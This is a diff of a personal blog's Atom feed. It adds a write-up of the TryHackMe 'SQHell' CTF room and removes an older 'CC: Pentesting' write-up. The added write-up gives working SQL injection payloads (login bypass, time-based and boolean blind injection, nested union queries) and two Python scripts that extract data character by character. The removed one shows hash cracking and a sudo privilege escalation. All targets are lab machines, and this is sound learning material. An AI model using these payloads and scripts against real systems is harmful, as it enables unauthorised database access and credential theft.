@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/author/darryn/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2021-05-05T16:55:34+00:00</updated>
+  <updated>2021-05-31T15:36:42+00:00</updated>
   <id>https://darrynbrownfield.co.uk/author/darryn/feed.xml</id>
 
   
@@ -30,6 +30,289 @@
   
   
 
+  
+    <entry>
+      <title type="html">SQHell Write Up</title>
+      <link href="https://darrynbrownfield.co.uk/sqhell" rel="alternate" type="text/html" title="SQHell Write Up" />
+      <published>2021-05-31T00:00:00+00:00</published>
+      <updated>2021-05-31T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/sqhell</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/sqhell">&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/cover.jpeg&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/sqhell&quot;&gt;sqhell&lt;/a&gt; is a fun medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/adamtlangley&quot;&gt;Adam Langley&lt;/a&gt;. I found this room incredibly frustrating but also very rewarding and really helped me understand some key SQLI techniques.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;I have wrote this write up over a couple of days, so I’ve added a entry in my etc hosts file of ‘sqhell.thm’ to provide consistency across the screen shots as the IP will change.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;I deployed the machine and started a NMAP scan to check the available ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.24.70
+# Nmap 7.80 scan initiated Sun May 30 17:55:54 2021 as: nmap -sC -sV -oA nmap/initial 10.10.24.70
+Nmap scan report for 10.10.24.70
+Host is up (0.026s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun May 30 17:56:03 2021 -- 1 IP address (1 host up) scanned in 8.36 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;2 Ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;22 - SSH - OpenSSH 8.2p1&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - nginx 1.18.0&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
+
+&lt;h3 id=&quot;flag-1&quot;&gt;Flag 1&lt;/h3&gt;
+
+&lt;p&gt;Based on the room name I know this is going to consist of SQLI challenges so I went straight to the web page and found a blog.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/homepage.png&quot; alt=&quot;homepage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The first thing I looked at was the login page, and tried the usual bypass technique: &lt;code class=&quot;highlighter-rouge&quot;&gt;admin' or 1=1;-- -&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag1.png&quot; alt=&quot;flag1&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;flag-2&quot;&gt;Flag 2&lt;/h3&gt;
+
+&lt;p&gt;Flag 2 was the first of the two difficult flags, Looking at the room hints:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Make sure to read the terms and conditions ;)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/TCs.png&quot; alt=&quot;TCs&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A common way of monitoring a client IP is adding a header to the web request such as ‘X-Forwarded-For: &lt;client ip=&quot;&quot;&gt;', I've seen this a lot on load balancers and WAF's to provide persistance and send all requests from a single source to the same webserver. Below are some example headers:&lt;/client&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;X-Forwarded-For:&lt;/li&gt;
+  &lt;li&gt;X-Originating-IP:&lt;/li&gt;
+  &lt;li&gt;X-Remote-IP:&lt;/li&gt;
+  &lt;li&gt;X-Remote-Addr:&lt;/li&gt;
+  &lt;li&gt;X-Forwarded-Host:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I can use time based SQL injection and use sleep, if the header is vulnerable the page will sleep (wait) before returning the page.&lt;/p&gt;
+
+&lt;p&gt;I opened Burp and added the X-Forwarded-For header, I tried lots of payloads with no success until I found a great &lt;a href=&quot;https://ismailtasdelen.medium.com/sql-injection-payload-list-b97656cfd66b&quot;&gt;resource&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Finally the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '1'='1&lt;/code&gt; worked.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/timebased.gif&quot; alt=&quot;timebased&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now I know the X-Forwarded-For header is vulnerable I need to find a way to retrieve data. The flag format is ‘THM{FLAG……’ and stored in the flag column in the flag table so I can use substring to check for each character and if its a match then sleep.&lt;/p&gt;
+
+&lt;p&gt;Using &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/sql-injection&quot;&gt;hacktricks&lt;/a&gt; I created the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;1' AND (SELECT sleep(5) FROM flag where SUBSTR(flag,1,1) = 'T') and '1'='1&lt;/code&gt;. I tested a few characters and incremented the offset and it confirmed this was flag 2. I created the below python script to automate the process.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# Script to retrieve flag 2 for room SQHell - https://tryhackme.com/room/sqhell
+
+import requests
+import time
+import string
+
+url = &quot;&quot; #Room IP
+
+characterlist = string.ascii_uppercase + string.digits + '{' + '}' + ':'
+
+flag = &quot;&quot;
+counter = 1
+
+payload = f&quot;1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{counter},1) = '2') and '1'='1&quot;
+
+headers = {'X-Forwarded-For':payload}
+
+while True:
+    for i in characterlist:
+        payload = f&quot;1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{counter},1) = '{i}') and '1'='1&quot;
+        headers = {'X-Forwarded-For':payload}
+        start = time.time()
+        r = requests.get(url, headers = headers)
+        end = time.time()
+        if end-start &amp;gt;= 2:
+            flag += i
+            counter += 1
+            break
+    print(flag)
+    if len(flag) &amp;gt;= 43:
+        exit(f&quot;The Flag is: {flag}&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Running the script will retrieve the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag2.png&quot; alt=&quot;flag2&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;flag-3&quot;&gt;Flag 3&lt;/h3&gt;
+&lt;p&gt;Looking at the register page of the blog, its possible to check if a username already exists.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/username.png&quot; alt=&quot;username&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is done by a script in the page source code.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;script&amp;gt;
+    $('input[name=&quot;username&quot;]').keyup(function(){
+        $('.userstatus').html('');
+        let username = $(this).val();
+        $.getJSON('/register/user-check?username='+ username,function(resp){
+            if( resp.available ){
+                $('.userstatus').css('color','#80c13d');
+                $('.userstatus').html('Username available');
+            }else{
+                $('.userstatus').css('color','#F00');
+                $('.userstatus').html('Username already taken');
+            }
+        });
+    });
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It’s possible to navigate directly to this endpoint to check the result.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/usernameavailable.gif&quot; alt=&quot;checkusername&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can use this to provide logic to determine if a condition is true or false. Using the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;admin' and 1=2;-- -&lt;/code&gt; which of course is not true as 1 doesnt equal 1 returns an available = true statement.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/false.png&quot; alt=&quot;false&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;admin' and 1=1;-- -&lt;/code&gt; which is true returns available = false&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/true.png&quot; alt=&quot;true&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using substring again allows for each character to be checked. If the character is a match, an available equals false will be returned. To confirm I used the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/register/user-check?username=admin' and (substr((SELECT flag FROM flag LIMIT 0,1),1,1)) = 'T';-- -&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This worked and returned a false statement. I created a script to automate the process.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;import requests
+import string
+
+characterlist = string.ascii_uppercase + string.digits + '{' + '}' + ':'
+
+ip = &quot;&quot; #change to machine IP
+
+flag = &quot;&quot;
+
+counter = 1
+
+while True:
+    for i in characterlist: # loop through each character in the character list
+        r = requests.get(&quot;http://&quot; +  ip + f&quot;/register/user-check?username=admin' and (substr((SELECT flag FROM flag LIMIT 0,1),{counter},1)) = '{i}';-- -&quot;) #create request
+        if 'false' in r.text: # check if return 'false' statement which indicates a match
+            flag += i # add the character to the flag string
+            counter += 1 # increment the counter by one to then check the next letter
+            print(flag) 
+            break
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Running the script provided the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag3.png&quot; alt=&quot;flag3&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;flag-4&quot;&gt;Flag 4&lt;/h3&gt;
+&lt;p&gt;Flag 4 was the second of the two difficult flags, it has the following hint:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Well, dreams, they feel real while we’re in them right?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Googling this provides references to the film Inception. Looking at a user on the blog, showed details of the user along with the posts they had submitted.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/user.png&quot; alt=&quot;user&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried a union select payload and repeated adding null entires until I was able to determine the number of columns which was 3.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/user?id=1 union select null,null,null;-- -&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/select.png&quot; alt=&quot;select&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I now spent a long time enumerating the database to find the flag but with no luck. While completing the enumeration I was able to determine there was only one user. Any other number resulted in user not found being returned.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/select.png&quot; alt=&quot;user2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, even with an invalid user id, if I changed the first null value to &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; I could return a list of the users posts. Which would indicate another SQL query.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/id1.png&quot; alt=&quot;id1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So to test this I created another union select statement in the user id colum using the same technique as before by repeatedly adding null columns. Once I got to 4 columns the two posts were returned with a blank bullet point.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/inception.png&quot; alt=&quot;inception&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now it was just a case of finding a column which I could use to populate the flag which was column two and select the flag from the flag table. The final payload was: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/user?id=2 union select &quot;1 union select null,flag,null,null from flag&quot;,null,null from information_schema.tables where table_schema=database();-- -&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag4.png&quot; alt=&quot;flag4&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;flag-5&quot;&gt;Flag 5&lt;/h3&gt;
+&lt;p&gt;Flag 5 is obtained by using union based injection Looking at the post page url, the posts are retrieved by id: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/post?id=2&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/postid.png&quot; alt=&quot;postid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This looks injectable, to confirm I simply added a &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt; after the id number.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/iderror.png&quot; alt=&quot;iderror&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This resulted in an error indicating an SQLI could be possible. For a union select injection attack to work the number of returned columns need to match the original query. I used order by to determine the number of columns.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/idorder.gif&quot; alt=&quot;idorder&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I got an error on order by 5 indicating there are 4 columns.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/idtesting.png&quot; alt=&quot;idtesting&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I was then able to simple retrieve the flag using the payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sqhell.thm/post?id=2 and 1=2 union select null,null,flag,null from flag&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sqhell/flag5.png&quot; alt=&quot;flag5&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;
+
+&lt;h3 id=&quot;resources&quot;&gt;Resources:&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/&lt;/li&gt;
+  &lt;li&gt;https://ismailtasdelen.medium.com/sql-injection-payload-list-b97656cfd66b&lt;/li&gt;
+  &lt;li&gt;https://book.hacktricks.xyz/pentesting-web/sql-injection&lt;/li&gt;
+&lt;/ul&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="tryhackme" />
+      
+        <category term="ctf" />
+      
+        <category term="medium" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">Lazy Admin Write Up</title>
@@ -2852,161 +3135,6 @@ brookly_nine_nine
 root.txt
 #
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Darryn</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="tryhackme" />
-      
-        <category term="ctf" />
-      
-        <category term="easy" />
-      
-
-      
-        <summary type="html"></summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">CC: Pentesting Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/ccpentesting" rel="alternate" type="text/html" title="CC: Pentesting Write Up" />
-      <published>2020-12-08T00:00:00+00:00</published>
-      <updated>2020-12-08T00:00:00+00:00</updated>
-      <id>https://darrynbrownfield.co.uk/ccpentesting</id>
-      <content type="html" xml:base="https://darrynbrownfield.co.uk/ccpentesting">&lt;p&gt;&lt;img src=&quot;/assets/images/ccpentesting/cover.png&quot; alt=&quot;CCPentesting&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/ccpentesting&quot;&gt;CC:Pen Testing&lt;/a&gt; is a guided room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; providing an introduction to some of the common penetration testing tools. Its really well layed out and I recommend to anyone starting out in penetration testing or CTF challenges. This write up will only cover the steps for the final exam.&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;As normal, I kicked off a nmap scan to see what ports are available.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA initial 10.10.215.190
-[sudo] password for daz: 
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-08 21:42 GMT
-Nmap scan report for 10.10.215.190
-Host is up (0.027s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 12:96:a6:1e:81:73:ae:17:4c:e1:7c:63:78:3c:71:1c (RSA)
-|   256 6d:9c:f2:07:11:d2:aa:19:99:90:bb:ec:6b:a1:53:77 (ECDSA)
-|_  256 0e:a5:fa:ce:f2:ad:e6:fa:99:f3:92:5f:87:bb:ba:f4 (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;The web page displays the basic apache page, I checked the source code but everything was standard. I kicked off a gobuster to see what other directories were available.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.215.190 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.215.190
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2020/12/08 21:49:12 Starting gobuster
-===============================================================
-/secret (Status: 301)
-/server-status (Status: 403)
-===============================================================
-2020/12/08 21:51:09 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;One directory found ‘/secret’, going to secret doesn’t display anything. I ran a second gobuster but this time in the secret folder and checked for .log, .txt and .html using the -x flag.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.215.190/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x log,txt,html
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.215.190/secret
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Extensions:     log,txt,html
-[+] Timeout:        10s
-===============================================================
-2020/12/08 21:55:16 Starting gobuster
-===============================================================
-/index.html (Status: 200)
-/secret.txt (Status: 200)
-Progress: 49450 / 220561 (22.42%)^C
-[!] Keyboard interrupt detected, terminating.
-===============================================================
-2020/12/08 21:59:31 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;1 additional file found, secret.txt. Web browsing to http://10.10.215.190/secret/secret.txt I could see the contents of the file:&lt;/p&gt;
-
-&lt;p&gt;nyan:046385855FC9580393853D8E(REDACTED)&lt;/p&gt;
-
-&lt;p&gt;The password looks to be SHA1. I put the hash in to a file called hash.txt on my VM and ran hashcat with the command: hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt –force&lt;/p&gt;
-
-&lt;p&gt;Hashcat was successfully able to crack the hash and I was able to SSH in to the machine.&lt;/p&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;Once connected via SSH I ran ‘sudo -l’, the user nyan is able to run the command /bin/su as root without providing a password. This provides a simple privesc by using the command: ‘sudo su’&lt;/p&gt;
-
-&lt;p&gt;Other techniques like this can be found on &lt;a href=&quot;https://gtfobins.github.io&quot;&gt;gtfobins&lt;/a&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;nyan@ubuntu:~$ sudo -l
-Matching Defaults entries for nyan on ubuntu:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User nyan may run the following commands on ubuntu:
-    (root) NOPASSWD: /bin/su
-nyan@ubuntu:~$
-nyan@ubuntu:~$ sudo su
-root@ubuntu:/home/nyan# id
-uid=0(root) gid=0(root) groups=0(root)
-root@ubuntu:/home/nyan# 
-&lt;/code&gt;&lt;/pre&gt;
-
 &lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
 
       
